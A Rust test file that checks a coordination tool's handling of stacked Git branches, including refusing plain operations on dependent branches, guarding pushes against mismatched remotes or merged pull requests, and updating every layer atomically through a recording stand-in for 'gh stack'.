//! Stack-tool enforcement: plain operations on a dependent branch are
//! refused, the typed `gh stack` adapter runs non-interactively with an
//! explicit remote, doctor reports a missing tool, and a merged base yields
//! per-writer retarget steps. The adapter runs a recording stand-in for
//! `gh`, not the real extension; everything else uses temporary stores.

use crate::common;
use crate::workflows_support;

use std::{
    cell::{Cell, RefCell},
    collections::{BTreeMap, BTreeSet},
    time::Duration,
};

use common::{TestResult, commit, ttl};
use kitchen::{
    BackendId, TaskId,
    contracts::{
        BranchName, CommitId, ContractError, Fence, Grant, HouseGrants, IssueNumber, Permission,
        Repository, TaskAuthority, Workspace,
    },
    house::{DoctorCode, StackTool, StackToolStatus, Workflow, stack_tool_finding},
    state::StateError,
    workflows::{
        coordination::{LaunchOutcome, launch_worker},
        pickup::{ClaimOutcome, TaskTemplate, claim_issue, issue_task_id},
        push::{
            GitConfigKey, GitRemote, LayersPermit, PullRequests, PushIntent, PushPermit,
            PushRefusal, PushSetting, RefUpdater, RemoteBranches, UpdateFailure,
        },
        repair::{Mergeability, Observed, PullRequestState, PullRequestView},
        stack::{
            BranchLayer, BranchOperation, Dependent, GhStack, LocalBranches, LowerLayerFault,
            MAX_STACK_LAYERS, MergedBase, RetargetStep, StackBoundary, StackCommand,
            StackLayerView, StackLink, StackOutcome, StackPullRequest, StackRefusal, StackResult,
            StackRunner, StackView, UpperLayerFault, Upstack, check_plain, plan_retarget, upstack,
        },
    },
};
use workflows_support::{World, branch, brief, issue, template, under_consumer};

// Plain paths.

#[test]
fn plain_operations_on_a_dependent_branch_are_refused_under_a_stack_tool() -> TestResult {
    let dependent = BranchLayer::Dependent {
        parent: branch("lemarier/issue-4")?,
    };
    for operation in [
        BranchOperation::Create,
        BranchOperation::Rebase,
        BranchOperation::Retarget,
        BranchOperation::Push,
    ] {
        assert_eq!(
            check_plain(Some(StackTool::GhStack), &dependent, operation),
            Err(StackRefusal::StackToolRequired {
                tool: StackTool::GhStack,
                operation
            })
        );
        assert_eq!(check_plain(None, &dependent, operation), Ok(()));
        assert_eq!(
            check_plain(
                Some(StackTool::GhStack),
                &BranchLayer::Independent,
                operation
            ),
            Ok(())
        );
    }
    Ok(())
}

// The stack boundary.

/// Answers `view` for [`StackCommand::View`] and `answer` for the rest, and
/// records every other command it ran and every link.
struct Recording {
    commands: RefCell<Vec<StackCommand>>,
    links: RefCell<Vec<StackLink>>,
    view: StackResult,
    answer: StackResult,
}

impl Recording {
    fn answering(answer: StackResult) -> TestResult<Self> {
        Ok(Self {
            commands: RefCell::new(Vec::new()),
            links: RefCell::new(Vec::new()),
            view: StackResult::Viewed(stack_with_prs(&[("lemarier/issue-5", false, Some(5))])?),
            answer,
        })
    }

    fn linked(&self) -> Vec<StackLink> {
        self.links.borrow().clone()
    }

    fn with_view(mut self, view: StackResult) -> Self {
        self.view = view;
        self
    }

    fn ran(&self) -> Vec<StackCommand> {
        self.commands.borrow().clone()
    }
}

impl StackRunner for Recording {
    fn run(&self, command: &StackCommand) -> StackResult {
        if command == &StackCommand::View {
            return self.view.clone();
        }
        self.commands.borrow_mut().push(command.clone());
        self.answer.clone()
    }

    fn link(&self, link: &StackLink) -> StackResult {
        self.links.borrow_mut().push(link.clone());
        self.answer.clone()
    }
}

/// Each atomic update as `(branch, replaces, commit)` per layer.
type LayerCall = Vec<(String, Option<CommitId>, CommitId)>;

fn layer_call(permit: &LayersPermit) -> LayerCall {
    permit
        .updates()
        .iter()
        .map(|update| {
            (
                update.branch().as_str().to_owned(),
                update.replaces().cloned(),
                update.commit().clone(),
            )
        })
        .collect()
}

/// A stack on `main`, bottom to top: each layer's name and whether it merged.
fn stack_view(layers: &[(&str, bool)]) -> TestResult<StackView> {
    Ok(StackView {
        trunk: branch("main")?,
        branches: layers
            .iter()
            .map(|(name, merged)| {
                Ok(StackLayerView {
                    name: branch(name)?,
                    is_merged: *merged,
                    needs_rebase: false,
                    pr: None,
                })
            })
            .collect::<TestResult<_>>()?,
    })
}

/// Scripted pull-request and remote reads.
struct Remote {
    pull_request: Observed<Option<PullRequestView>>,
    head: Observed<Option<CommitId>>,
    bound: Observed<bool>,
    pushes: Observed<bool>,
    reads: Cell<u32>,
    updated: RefCell<Vec<LayerCall>>,
}

impl Remote {
    fn open() -> TestResult<Self> {
        Ok(Self {
            pull_request: Observed::Known(Some(pr_view(PullRequestState::Open)?)),
            head: Observed::Known(Some(commit('d')?)),
            bound: Observed::Known(true),
            pushes: Observed::Known(true),
            reads: Cell::new(0),
            updated: RefCell::new(Vec::new()),
        })
    }
}

impl PullRequests for Remote {
    fn pull_request(&self, _: IssueNumber) -> Observed<Option<PullRequestView>> {
        self.reads.set(self.reads.get() + 1);
        self.pull_request.clone()
    }

    fn default_branch(&self) -> Observed<BranchName> {
        BranchName::new("main").map_or(Observed::Unknown, Observed::Known)
    }
}

impl RemoteBranches for Remote {
    fn reads_from(&self, _: &Repository) -> Observed<bool> {
        self.bound
    }

    fn head(&self, _: &BranchName) -> Observed<Option<CommitId>> {
        self.reads.set(self.reads.get() + 1);
        self.head.clone()
    }
}

impl RefUpdater for Remote {
    fn pushes_to(&self, _: &Repository) -> Observed<bool> {
        self.pushes
    }

    fn redirect(&self, _: &Repository) -> Observed<Option<GitConfigKey>> {
        Observed::Known(None)
    }

    /// The stack path updates every layer at once, never one ref.
    fn update(&self, _: &PushPermit, _: &BranchName, _: &CommitId) -> Result<(), UpdateFailure> {
        Err(UpdateFailure::Rejected)
    }

    fn update_layers(&self, permit: &LayersPermit) -> Result<(), UpdateFailure> {
        self.updated.borrow_mut().push(layer_call(permit));
        Ok(())
    }
}

impl LocalBranches for Remote {
    fn local_head(&self, _: &BranchName) -> Observed<Option<CommitId>> {
        self.head.clone()
    }

    fn includes(&self, _: &BranchName, _: &CommitId) -> Observed<bool> {
        Observed::Known(false)
    }
}

fn pr_view(state: PullRequestState) -> TestResult<PullRequestView> {
    Ok(PullRequestView {
        number: number(5)?,
        state,
        head: commit('d')?,
        head_branch: "lemarier/issue-5".to_owned(),
        base_branch: "lemarier/issue-4".to_owned(),
        mergeability: Mergeability::Clean,
    })
}

fn intent() -> TestResult<PushIntent> {
    Ok(PushIntent {
        pull_request: Some(number(5)?),
        expected_remote: Some(commit('d')?),
    })
}

struct Stacking {
    world: World,
    task: TaskId,
    fence: Fence,
    github: BackendId,
}

/// Claim issue `number` with `requested` and launch its worker on
/// `lemarier/issue-<number>`.
fn claim_and_launch(
    world: &World,
    number: u64,
    template: &TaskTemplate,
) -> TestResult<(TaskId, Fence)> {
    // The first task is claimed under the pickup consumer; the others, like
    // tasks another coordinator holds, directly.
    let claimant = if number == 5 {
        under_consumer(world, "coordinator")?.0
    } else {
        common::scheduled(&format!("coordinator-{number}"))?
    };
    let ClaimOutcome::Claimed(lease) = claim_issue(
        &world.fixture.store,
        template,
        &issue(number)?,
        &claimant,
        ttl(300)?,
        world.now(),
    )?
    else {
        return Err("issue not claimed".into());
    };
    let task = issue_task_id(&issue(number)?)?;
    match launch_worker(
        &world.ctx(),
        &task,
        lease.fence(),
        Workspace::Isolated,
        &brief(number)?,
    )? {
        LaunchOutcome::Accepted { .. } => Ok((task, lease.fence())),
        other => Err(format!("launch not accepted: {other:?}").into()),
    }
}

fn worker_grants() -> TestResult<Vec<Grant>> {
    common::WORKER_PERMISSIONS
        .iter()
        .map(|permission| common::grant(*permission))
        .collect()
}

/// A template allowing `attempts` attempts, delegated worker lifecycle from
/// `world`'s grants.
fn worker_template(world: &World, attempts: u32) -> TestResult<TaskTemplate> {
    let mut spec = workflows_support::template_with(attempts, workflows_support::provenance('a')?)?;
    spec.authority = TaskAuthority::delegate(&world.grants, worker_grants()?)?;
    Ok(spec)
}

fn stacking_with(house: &[Grant], requested: Vec<Grant>) -> TestResult<Stacking> {
    let mut world = World::new()?;
    world.grants = HouseGrants::new(common::house()?, house.to_vec());
    let mut spec: TaskTemplate = template()?;
    spec.authority = TaskAuthority::delegate(&world.grants, requested)?;
    let (task, fence) = claim_and_launch(&world, 5, &spec)?;
    Ok(Stacking {
        world,
        task,
        fence,
        github: BackendId::new("github")?,
    })
}

fn github_grant(permission: Permission) -> TestResult<Grant> {
    Ok(Grant::repository(
        permission,
        workflows_support::repo()?,
        BackendId::new("github")?,
        common::credential()?,
    ))
}

/// A task delegated worker lifecycle and the given GitHub permissions.
fn stacking_granted(permissions: &[Permission]) -> TestResult<Stacking> {
    let mut grants = worker_grants()?;
    for permission in permissions {
        grants.push(github_grant(*permission)?);
    }
    stacking_with(&grants, grants.clone())
}

fn stacking() -> TestResult<Stacking> {
    stacking_granted(&[
        Permission::PushBranch,
        Permission::OpenPullRequest,
        Permission::RequestReview,
    ])
}

fn boundary<'a>(
    setup: &'a Stacking,
    runner: &'a Recording,
    remote: &'a Remote,
) -> StackBoundary<'a> {
    StackBoundary {
        store: &setup.world.fixture.store,
        grants: &setup.world.grants,
        destination: &setup.github,
        clock: &setup.world.clock,
        runner,
        pull_requests: remote,
        remote,
        updater: remote,
        local: remote,
        opener: None,
    }
}

fn run(setup: &Stacking, runner: &Recording, command: &StackCommand) -> TestResult<StackOutcome> {
    let remote = Remote::open()?;
    Ok(boundary(setup, runner, &remote).run(&setup.task, setup.fence, command, &intent()?)?)
}

#[test]
fn the_stack_tool_path_runs_commands_bound_to_the_tasks_branch() -> TestResult {
    let setup = stacking()?;
    let runner = Recording::answering(StackResult::Done)?;
    // Adopting an existing chain that contains the task's branch.
    let adopt = StackCommand::Adopt {
        trunk: branch("main")?,
        branches: vec![
            branch("lemarier/issue-4")?,
            branch("lemarier/issue-5")?,
            branch("lemarier/issue-6")?,
        ],
    };
    let accepted = [
        adopt,
        StackCommand::Add {
            branch: branch("lemarier/issue-5")?,
        },
        StackCommand::RebaseUpstack,
        StackCommand::Push,
        StackCommand::Submit { ready: false },
        StackCommand::Submit { ready: true },
    ];
    for command in &accepted {
        assert_eq!(
            run(&setup, &runner, command)?,
            StackOutcome::Ran(StackResult::Done)
        );
    }
    // The boundary pushes the layers itself; the tool only links them.
    assert_eq!(runner.ran(), accepted[..3].to_vec());
    let mut links = Vec::new();
    for ready in [false, true] {
        links.push(StackLink {
            trunk: branch("main")?,
            pull_requests: vec![number(5)?],
            ready,
        });
    }
    assert_eq!(runner.linked(), links);
    Ok(())
}

#[test]
fn the_stack_boundary_refuses_other_branches_and_bad_chains() -> TestResult {
    let setup = stacking()?;
    let runner = Recording::answering(StackResult::Done)?;
    let too_many: Vec<_> = (0..=MAX_STACK_LAYERS)
        .map(|layer| branch(&format!("lemarier/layer-{layer}")))
        .chain([branch("lemarier/issue-5")])
        .collect::<TestResult<_>>()?;
    let adopt = |branches: Vec<BranchName>| -> TestResult<StackCommand> {
        Ok(StackCommand::Adopt {
            trunk: branch("main")?,
            branches,
        })
    };
    let refused = [
        (
            StackCommand::Add {
                branch: branch("lemarier/issue-6")?,
            },
            StackRefusal::ForeignBranch,
        ),
        (
            adopt(vec![branch("lemarier/issue-4")?])?,
            StackRefusal::ForeignBranch,
        ),
        (adopt(Vec::new())?, StackRefusal::InvalidLayers),
        (
            adopt(vec![
                branch("lemarier/issue-5")?,
                branch("lemarier/issue-5")?,
            ])?,
            StackRefusal::InvalidLayers,
        ),
        (adopt(too_many)?, StackRefusal::InvalidLayers),
    ];
    for (command, refusal) in refused {
        assert_eq!(
            run(&setup, &runner, &command)?,
            StackOutcome::Refused(refusal)
        );
    }
    assert!(runner.ran().is_empty());
    Ok(())
}

#[test]
fn who_works_above_is_derived_from_the_stack_and_the_houses_tasks() -> TestResult {
    let setup = stacking()?;
    // Issue 6 is claimed and its worker runs on the layer above.
    claim_and_launch(&setup.world, 6, &worker_template(&setup.world, 3)?)?;
    let store = &setup.world.fixture.store;
    let own = branch("lemarier/issue-5")?;
    let cases = [
        (vec![("lemarier/issue-5", false)], Upstack::Top),
        // A merged layer above is nobody's work.
        (
            vec![("lemarier/issue-5", false), ("lemarier/issue-6", true)],
            Upstack::Top,
        ),
        (
            vec![("lemarier/issue-5", false), ("lemarier/issue-6", false)],
            Upstack::Busy,
        ),
        // No task of this house owns the layer: a person may.
        (
            vec![("lemarier/issue-5", false), ("lemarier/person", false)],
            Upstack::Unknown,
        ),
        // The task's branch is not in the stack at all.
        (vec![("lemarier/issue-4", false)], Upstack::Unknown),
    ];
    for (layers, expected) in cases {
        assert_eq!(
            upstack(store, &stack_view(&layers)?, &own)?,
            expected,
            "{layers:?}"
        );
    }

    // Commands that rewrite or push upper layers need them free.
    let busy = StackResult::Viewed(stack_view(&[
        ("lemarier/issue-5", false),
        ("lemarier/issue-6", false),
    ])?);
    for (view, command) in [
        (busy.clone(), StackCommand::RebaseUpstack),
        (busy, StackCommand::Submit { ready: true }),
        (StackResult::Locked, StackCommand::Push),
        (StackResult::Uncertain, StackCommand::Push),
    ] {
        let runner = Recording::answering(StackResult::Done)?.with_view(view);
        assert_eq!(
            run(&setup, &runner, &command)?,
            StackOutcome::Refused(StackRefusal::UpstackBusy)
        );
        assert!(runner.ran().is_empty());
    }
    Ok(())
}

#[test]
fn a_settled_task_above_leaves_the_upper_layer_idle() -> TestResult {
    use kitchen::contracts::{WorkerOutcome, WorkerState};
    use kitchen::workflows::coordination::{SupervisionInput, supervise};
    let setup = stacking()?;
    let (task, fence) = claim_and_launch(&setup.world, 6, &worker_template(&setup.world, 1)?)?;
    let record = setup.world.fixture.store.task(&task)?;
    let worker = kitchen::workflows::coordination::current_worker(&record)
        .ok_or("no worker")?
        .worker;
    setup
        .world
        .backend
        .set_worker_state(&worker, WorkerState::Settled(WorkerOutcome::Failed));
    supervise(
        &setup.world.ctx(),
        &task,
        fence,
        &workflows_support::supervision()?,
        &SupervisionInput::default(),
    )?;
    let view = stack_view(&[("lemarier/issue-5", false), ("lemarier/issue-6", false)])?;
    assert_eq!(
        upstack(
            &setup.world.fixture.store,
            &view,
            &branch("lemarier/issue-5")?
        )?,
        Upstack::Idle
    );
    let runner = Recording::answering(StackResult::Done)?.with_view(StackResult::Viewed(view));
    assert_eq!(
        run(&setup, &runner, &StackCommand::Push)?,
        StackOutcome::Ran(StackResult::Done)
    );
    Ok(())
}

#[test]
fn an_active_task_on_a_layers_branch_keeps_the_layer_busy_behind_a_settled_one() -> TestResult {
    use kitchen::contracts::{WorkerOutcome, WorkerState};
    use kitchen::workflows::coordination::{SupervisionInput, supervise};
    let setup = stacking()?;
    // Issue 6 launched on its branch and failed. Issue 7, such as a repair,
    // works on the same branch and sorts after it.
    let (first, fence) = claim_and_launch(&setup.world, 6, &worker_template(&setup.world, 1)?)?;
    let record = setup.world.fixture.store.task(&first)?;
    let worker = kitchen::workflows::coordination::current_worker(&record)
        .ok_or("no worker")?
        .worker;
    setup
        .world
        .backend
        .set_worker_state(&worker, WorkerState::Settled(WorkerOutcome::Failed));
    supervise(
        &setup.world.ctx(),
        &first,
        fence,
        &workflows_support::supervision()?,
        &SupervisionInput::default(),
    )?;
    let view = stack_view(&[("lemarier/issue-5", false), ("lemarier/issue-6", false)])?;
    let own = branch("lemarier/issue-5")?;
    let store = &setup.world.fixture.store;
    assert_eq!(upstack(store, &view, &own)?, Upstack::Idle);

    let mut second = brief(7)?;
    second.branch = branch("lemarier/issue-6")?;
    let ClaimOutcome::Claimed(lease) = claim_issue(
        store,
        &worker_template(&setup.world, 1)?,
        &issue(7)?,
        &common::scheduled("coordinator-7")?,
        ttl(300)?,
        setup.world.now(),
    )?
    else {
        return Err("issue not claimed".into());
    };
    let launched = launch_worker(
        &setup.world.ctx(),
        &issue_task_id(&issue(7)?)?,
        lease.fence(),
        Workspace::Isolated,
        &second,
    )?;
    assert!(
        matches!(launched, LaunchOutcome::Accepted { .. }),
        "{launched:?}"
    );
    assert_eq!(upstack(store, &view, &own)?, Upstack::Busy);
    let runner = Recording::answering(StackResult::Done)?.with_view(StackResult::Viewed(view));
    assert_eq!(
        run(&setup, &runner, &StackCommand::RebaseUpstack)?,
        StackOutcome::Refused(StackRefusal::UpstackBusy)
    );
    assert!(runner.ran().is_empty());
    Ok(())
}

#[test]
fn the_stack_path_runs_the_push_boundarys_checks_first() -> TestResult {
    let setup = stacking()?;
    let with = |change: &dyn Fn(&mut Remote)| -> TestResult<Remote> {
        let mut remote = Remote::open()?;
        change(&mut remote);
        Ok(remote)
    };
    let cases: Vec<(&str, Remote, PushRefusal)> = vec![
        (
            "merged",
            with(&|remote| {
                remote.pull_request = pr_view(PullRequestState::Merged)
                    .map_or(Observed::Unknown, |view| Observed::Known(Some(view)));
            })?,
            PushRefusal::Merged,
        ),
        (
            "closed",
            with(&|remote| {
                remote.pull_request = pr_view(PullRequestState::Closed)
                    .map_or(Observed::Unknown, |view| Observed::Known(Some(view)));
            })?,
            PushRefusal::Closed,
        ),
        (
            "deleted",
            with(&|remote| remote.head = Observed::Known(None))?,
            PushRefusal::BranchDeleted,
        ),
        (
            "moved",
            with(&|remote| {
                remote.head = commit('f').map_or(Observed::Unknown, |id| Observed::Known(Some(id)))
            })?,
            PushRefusal::RemoteMoved {
                found: commit('f')?,
            },
        ),
        (
            "unreadable",
            with(&|remote| remote.head = Observed::Unknown)?,
            PushRefusal::Unknown,
        ),
        (
            "another repository",
            with(&|remote| remote.bound = Observed::Known(false))?,
            PushRefusal::RemoteMismatch,
        ),
    ];
    for command in [
        StackCommand::Push,
        StackCommand::Submit { ready: false },
        StackCommand::RebaseUpstack,
    ] {
        for (name, remote, refusal) in &cases {
            let runner = Recording::answering(StackResult::Done)?;
            let outcome = boundary(&setup, &runner, remote).run(
                &setup.task,
                setup.fence,
                &command,
                &intent()?,
            )?;
            assert_eq!(
                outcome,
                StackOutcome::Refused(StackRefusal::Push(refusal.clone())),
                "{name} {command:?}"
            );
            assert!(runner.ran().is_empty(), "{name} ran the tool");
        }
    }
    Ok(())
}

#[test]
fn the_stack_path_refuses_a_push_url_that_is_not_the_granted_repository() -> TestResult {
    let setup = stacking()?;
    for (pushes, refusal) in [
        (Observed::Known(false), PushRefusal::RemoteMismatch),
        (Observed::Unknown, PushRefusal::Unknown),
    ] {
        // Fetches read the granted repository; only the push URL differs.
        let mut remote = Remote::open()?;
        remote.pushes = pushes;
        for command in [
            StackCommand::Push,
            StackCommand::Submit { ready: false },
            StackCommand::RebaseUpstack,
        ] {
            let runner = Recording::answering(StackResult::Done)?;
            let outcome = boundary(&setup, &runner, &remote).run(
                &setup.task,
                setup.fence,
                &command,
                &intent()?,
            )?;
            assert_eq!(
                outcome,
                StackOutcome::Refused(StackRefusal::Push(refusal.clone())),
                "{pushes:?} {command:?}"
            );
            assert!(runner.ran().is_empty(), "{pushes:?} ran the tool");
        }
    }
    // With both URLs on the granted repository the same command runs.
    let runner = Recording::answering(StackResult::Done)?;
    assert_eq!(
        boundary(&setup, &runner, &Remote::open()?).run(
            &setup.task,
            setup.fence,
            &StackCommand::Push,
            &intent()?
        )?,
        StackOutcome::Ran(StackResult::Done)
    );
    Ok(())
}

/// Answers the push-URL check as scripted, one answer per call, then keeps
/// the last one.
struct PushUrls<'a> {
    remote: &'a Remote,
    answers: RefCell<Vec<Observed<bool>>>,
}

impl PullRequests for PushUrls<'_> {
    fn pull_request(&self, number: IssueNumber) -> Observed<Option<PullRequestView>> {
        self.remote.pull_request(number)
    }

    fn default_branch(&self) -> Observed<BranchName> {
        self.remote.default_branch()
    }
}

impl RefUpdater for PushUrls<'_> {
    fn pushes_to(&self, _: &Repository) -> Observed<bool> {
        let mut answers = self.answers.borrow_mut();
        if answers.len() > 1 {
            answers.remove(0)
        } else {
            answers.first().copied().unwrap_or(Observed::Unknown)
        }
    }

    fn redirect(&self, _: &Repository) -> Observed<Option<GitConfigKey>> {
        Observed::Known(None)
    }

    fn update(&self, _: &PushPermit, _: &BranchName, _: &CommitId) -> Result<(), UpdateFailure> {
        Err(UpdateFailure::Rejected)
    }

    fn update_layers(&self, permit: &LayersPermit) -> Result<(), UpdateFailure> {
        self.remote.update_layers(permit)
    }
}

#[test]
fn the_push_urls_are_read_again_right_before_the_tool_runs() -> TestResult {
    let setup = stacking()?;
    let remote = Remote::open()?;
    for command in [
        StackCommand::Push,
        StackCommand::Submit { ready: false },
        StackCommand::RebaseUpstack,
    ] {
        // The URLs pass at the first check and change before the tool runs.
        let updater = PushUrls {
            remote: &remote,
            answers: RefCell::new(vec![Observed::Known(true), Observed::Known(false)]),
        };
        let runner = Recording::answering(StackResult::Done)?;
        let outcome = StackBoundary {
            updater: &updater,
            ..boundary(&setup, &runner, &remote)
        }
        .run(&setup.task, setup.fence, &command, &intent()?)?;
        assert_eq!(
            outcome,
            StackOutcome::Refused(StackRefusal::Push(PushRefusal::RemoteMismatch)),
            "{command:?}"
        );
        assert!(runner.ran().is_empty(), "{command:?} ran the tool");
    }
    Ok(())
}

#[test]
fn a_stack_push_is_recorded_so_a_first_push_cannot_recreate_the_branch() -> TestResult {
    let setup = stacking()?;
    let runner = Recording::answering(StackResult::Done)?;
    assert_eq!(
        run(&setup, &runner, &StackCommand::Push)?,
        StackOutcome::Ran(StackResult::Done)
    );
    // The pull request merged and its branch was deleted: a "first push"
    // intent must not recreate it, and dropping the pull request is refused.
    let mut gone = Remote::open()?;
    gone.head = Observed::Known(None);
    gone.pull_request = Observed::Known(None);
    let first = PushIntent {
        pull_request: Some(number(5)?),
        expected_remote: None,
    };
    gone.pull_request = Observed::Known(Some(pr_view(PullRequestState::Open)?));
    assert_eq!(
        boundary(&setup, &runner, &gone).run(
            &setup.task,
            setup.fence,
            &StackCommand::Push,
            &first
        )?,
        StackOutcome::Refused(StackRefusal::Push(PushRefusal::BranchDeleted))
    );
    let unnamed = PushIntent {
        pull_request: None,
        expected_remote: None,
    };
    assert_eq!(
        boundary(&setup, &runner, &gone).run(
            &setup.task,
            setup.fence,
            &StackCommand::Push,
            &unnamed
        )?,
        StackOutcome::Refused(StackRefusal::Push(PushRefusal::PullRequestRequired))
    );
    assert!(runner.ran().is_empty(), "the tool never pushes");
    Ok(())
}

// Lower layers.

/// A layer's pull request `number` on `branch`, based on `base`, open at
/// `head`.
fn layer_pr(number_: u64, name: &str, base: &str, head: char) -> TestResult<PullRequestView> {
    Ok(PullRequestView {
        number: number(number_)?,
        state: PullRequestState::Open,
        head: commit(head)?,
        head_branch: name.to_owned(),
        base_branch: base.to_owned(),
        mergeability: Mergeability::Clean,
    })
}

/// Per-branch pull requests, remote heads, and checkout heads for the stack
/// `main <- issue-3 <- issue-4 <- issue-5`, the task's branch on top, with
/// every lower layer as the checkout holds it.
struct Layers {
    pull_requests: BTreeMap<u64, Observed<Option<PullRequestView>>>,
    remote: BTreeMap<&'static str, Observed<Option<CommitId>>>,
    local: BTreeMap<&'static str, Observed<Option<CommitId>>>,
    /// Whether a checkout branch integrated its remote head; `Known(false)`
    /// when absent.
    included: BTreeMap<&'static str, Observed<bool>>,
    answer: Result<(), UpdateFailure>,
    updated: RefCell<Vec<LayerCall>>,
}

impl Layers {
    fn consistent() -> TestResult<Self> {
        let known = |view: PullRequestView| Observed::Known(Some(view));
        let head = |fill: char| -> TestResult<Observed<Option<CommitId>>> {
            Ok(Observed::Known(Some(commit(fill)?)))
        };
        let heads = BTreeMap::from([
            ("lemarier/issue-3", head('a')?),
            ("lemarier/issue-4", head('b')?),
            ("lemarier/issue-5", head('d')?),
        ]);
        Ok(Self {
            pull_requests: BTreeMap::from([
                (3, known(layer_pr(3, "lemarier/issue-3", "main", 'a')?)),
                (
                    4,
                    known(layer_pr(4, "lemarier/issue-4", "lemarier/issue-3", 'b')?),
                ),
                (5, known(pr_view(PullRequestState::Open)?)),
            ]),
            remote: heads.clone(),
            local: heads,
            included: BTreeMap::new(),
            answer: Ok(()),
            updated: RefCell::new(Vec::new()),
        })
    }

    /// Change pull request `number` in place.
    fn edit(mut self, number: u64, change: impl FnOnce(&mut PullRequestView)) -> Self {
        if let Some(Observed::Known(Some(view))) = self.pull_requests.get_mut(&number) {
            change(view);
        }
        self
    }
}

impl PullRequests for Layers {
    fn pull_request(&self, number: IssueNumber) -> Observed<Option<PullRequestView>> {
        self.pull_requests
            .get(&number.get())
            .cloned()
            .unwrap_or(Observed::Known(None))
    }

    fn default_branch(&self) -> Observed<BranchName> {
        BranchName::new("main").map_or(Observed::Unknown, Observed::Known)
    }
}

impl RemoteBranches for Layers {
    fn reads_from(&self, _: &Repository) -> Observed<bool> {
        Observed::Known(true)
    }

    fn head(&self, branch: &BranchName) -> Observed<Option<CommitId>> {
        self.remote
            .get(branch.as_str())
            .cloned()
            .unwrap_or(Observed::Known(None))
    }
}

impl RefUpdater for Layers {
    fn pushes_to(&self, _: &Repository) -> Observed<bool> {
        Observed::Known(true)
    }

    fn redirect(&self, _: &Repository) -> Observed<Option<GitConfigKey>> {
        Observed::Known(None)
    }

    fn update(&self, _: &PushPermit, _: &BranchName, _: &CommitId) -> Result<(), UpdateFailure> {
        Err(UpdateFailure::Rejected)
    }

    fn update_layers(&self, permit: &LayersPermit) -> Result<(), UpdateFailure> {
        self.updated.borrow_mut().push(layer_call(permit));
        self.answer.clone()
    }
}

impl LocalBranches for Layers {
    fn local_head(&self, branch: &BranchName) -> Observed<Option<CommitId>> {
        self.local
            .get(branch.as_str())
            .cloned()
            .unwrap_or(Observed::Known(None))
    }

    fn includes(&self, branch: &BranchName, _: &CommitId) -> Observed<bool> {
        self.included
            .get(branch.as_str())
            .cloned()
            .unwrap_or(Observed::Known(false))
    }
}

/// A stack on `main`, bottom to top: each layer's name, whether the tool
/// holds it as merged, and its pull request.
fn stack_with_prs(layers: &[(&str, bool, Option<u64>)]) -> TestResult<StackView> {
    Ok(StackView {
        trunk: branch("main")?,
        branches: layers
            .iter()
            .map(|(name, merged, pr)| {
                Ok(StackLayerView {
                    name: branch(name)?,
                    is_merged: *merged,
                    needs_rebase: false,
                    pr: pr
                        .map(|pr| {
                            Ok::<_, Box<dyn std::error::Error>>(StackPullRequest {
                                number: number(pr)?,
                            })
                        })
                        .transpose()?,
                })
            })
            .collect::<TestResult<_>>()?,
    })
}

fn three_layers() -> TestResult<StackView> {
    stack_with_prs(&[
        ("lemarier/issue-3", false, Some(3)),
        ("lemarier/issue-4", false, Some(4)),
        ("lemarier/issue-5", false, Some(5)),
    ])
}

/// Run `command` for the task on `issue-5` against `layers` and `view`, and
/// the commands the tool ran.
fn run_layers(
    setup: &Stacking,
    view: StackView,
    layers: &Layers,
    command: &StackCommand,
) -> TestResult<(StackOutcome, Vec<StackCommand>)> {
    let (outcome, runner) = run_layers_with(setup, view, layers, command)?;
    Ok((outcome, runner.ran()))
}

/// [`run_layers`], returning the runner for its links.
fn run_layers_with(
    setup: &Stacking,
    view: StackView,
    layers: &Layers,
    command: &StackCommand,
) -> TestResult<(StackOutcome, Recording)> {
    let runner = Recording::answering(StackResult::Done)?.with_view(StackResult::Viewed(view));
    let outcome = StackBoundary {
        store: &setup.world.fixture.store,
        grants: &setup.world.grants,
        destination: &setup.github,
        clock: &setup.world.clock,
        runner: &runner,
        pull_requests: layers,
        remote: layers,
        updater: layers,
        local: layers,
        opener: None,
    }
    .run(&setup.task, setup.fence, command, &intent()?)?;
    Ok((outcome, runner))
}

/// Launch issue `number`'s worker on `name` and settle it, so the layer is
/// owned and idle.
fn settled_layer(setup: &Stacking, number_: u64, name: &str) -> TestResult {
    use kitchen::contracts::{WorkerOutcome, WorkerState};
    use kitchen::workflows::coordination::{SupervisionInput, current_worker, supervise};
    let store = &setup.world.fixture.store;
    let mut launched = brief(number_)?;
    launched.branch = branch(name)?;
    let ClaimOutcome::Claimed(lease) = claim_issue(
        store,
        &worker_template(&setup.world, 1)?,
        &issue(number_)?,
        &common::scheduled(&format!("coordinator-{number_}"))?,
        ttl(300)?,
        setup.world.now(),
    )?
    else {
        return Err("issue not claimed".into());
    };
    let task = issue_task_id(&issue(number_)?)?;
    launch_worker(
        &setup.world.ctx(),
        &task,
        lease.fence(),
        Workspace::Isolated,
        &launched,
    )?;
    let worker = current_worker(&store.task(&task)?)
        .ok_or("no worker")?
        .worker;
    setup
        .world
        .backend
        .set_worker_state(&worker, WorkerState::Settled(WorkerOutcome::Failed));
    supervise(
        &setup.world.ctx(),
        &task,
        lease.fence(),
        &workflows_support::supervision()?,
        &SupervisionInput::default(),
    )?;
    Ok(())
}

/// One layer update: `branch` from `replaces` to `commit`.
fn moves(
    branch: &str,
    replaces: char,
    commit_: char,
) -> TestResult<(String, Option<CommitId>, CommitId)> {
    Ok((branch.to_owned(), Some(commit(replaces)?), commit(commit_)?))
}

#[test]
fn a_stack_push_leases_every_layer_to_its_checked_head_in_one_update() -> TestResult {
    let setup = stacking()?;
    for command in [StackCommand::Push, StackCommand::Submit { ready: false }] {
        let mut layers = Layers::consistent()?;
        // The checkout holds a new commit on the task's branch.
        layers
            .local
            .insert("lemarier/issue-5", Observed::Known(Some(commit('e')?)));
        let (outcome, runner) = run_layers_with(&setup, three_layers()?, &layers, &command)?;
        assert_eq!(outcome, StackOutcome::Ran(StackResult::Done), "{command:?}");
        // Lower layers are held at the heads that were checked; only the
        // task's branch moves, from its checked remote head.
        assert_eq!(
            layers.updated.borrow().clone(),
            vec![vec![
                moves("lemarier/issue-3", 'a', 'a')?,
                moves("lemarier/issue-4", 'b', 'b')?,
                moves("lemarier/issue-5", 'd', 'e')?,
            ]],
            "{command:?}"
        );
        assert!(runner.ran().is_empty(), "the tool pushed: {command:?}");
        let links = runner.linked();
        match command {
            StackCommand::Submit { .. } => {
                // Every layer has a pull request: the tool pushes nothing.
                assert_eq!(
                    links,
                    vec![StackLink {
                        trunk: branch("main")?,
                        pull_requests: vec![number(3)?, number(4)?, number(5)?],
                        ready: false,
                    }]
                );
            }
            _ => assert!(links.is_empty(), "a push links nothing"),
        }
    }
    Ok(())
}

#[test]
